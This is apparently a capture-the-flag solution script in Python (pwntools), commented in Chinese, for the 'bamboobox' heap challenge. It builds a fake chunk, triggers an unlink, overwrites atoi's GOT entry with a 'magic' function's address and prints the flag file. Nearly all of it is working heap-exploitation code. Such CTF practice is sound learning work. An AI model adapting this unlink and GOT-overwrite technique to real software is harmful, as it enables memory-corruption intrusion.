#!/usr/bin/env python
# -*- coding: utf-8 -*-
####################################################
# unlink 解法
# 构造fakechunk，free掉相邻的下一个chunk之后
# 可以控制ptr-0x18的地址
# 覆盖掉atoi的got表，使其指向magic函数的地址
# 之后调用atoi即可输出/home/bamboobox/flag的内容
####################################################
from pwn import *
context(log_level="debug")

p = process('./bamboobox')
elf = ELF('./bamboobox')
#gdb.attach(p, 'b menu')


def show():
	p.sendlineafter('Your choice:', '1')

def add(size, content):
	p.sendlineafter('Your choice:', '2')
	p.sendlineafter('Please enter the length of item name:',str(size))
	p.sendafter('Please enter the name of item:', content)

def change(index, size, content):
	p.sendlineafter('Your choice:','3')
	p.sendlineafter('Please enter the index of item:', str(index))
	p.sendlineafter('Please enter the length of item name:', str(size))
	p.sendafter('Please enter the new name of the item:', content)

def remove(index):
	p.sendlineafter('Your choice:', '4')
	p.sendlineafter('Please enter the index of item:', str(index))

magic  = 0x0000000000400d49
target = 0x00000000006020c8 # itemlist
atoi_got=elf.got['atoi']    # 
free_got=elf.got['free']    # 0x602018 这里很迷，覆盖free的got表不好使。。

log.info('****************leak free_got******************')
log.info('atoi_got ---> p[%s] '%hex(atoi_got))
log.info('free_got ---> p[%s] '%hex(free_got))
fakechunk  = p64(0) + p64(0x91)
fakechunk += p64(target - 0x18) + p64(target - 0x10)
fakechunk += 'a' * 0x70
fakechunk += p64(0x90) + p64(0xa0)

add(0x90,"aaaa")
add(0x90,"cccc")
add(0x10,"dddd")

# 构造fackchunk
change(0, 0xa0, fakechunk)

# free chunk1之后，使其同构造的fackchunk发生unlink
remove(1)

#change(0, 0x20, 'b'*0x18 + p64(free_got)) # 这一条NG，猜测环境中某些内存被破坏导致不可执行了？

# 将ptr的内容覆盖为atoi的got表地址
change(0, 0x20, 'b'*0x18 + p64(atoi_got))

# 将atoi函数的got表内容覆盖为magic函数的地址
change(0, 0x8, p64(magic))

# 调用remove中的atoi函数，执行magic，cat flag
remove(2)
p.interactive()
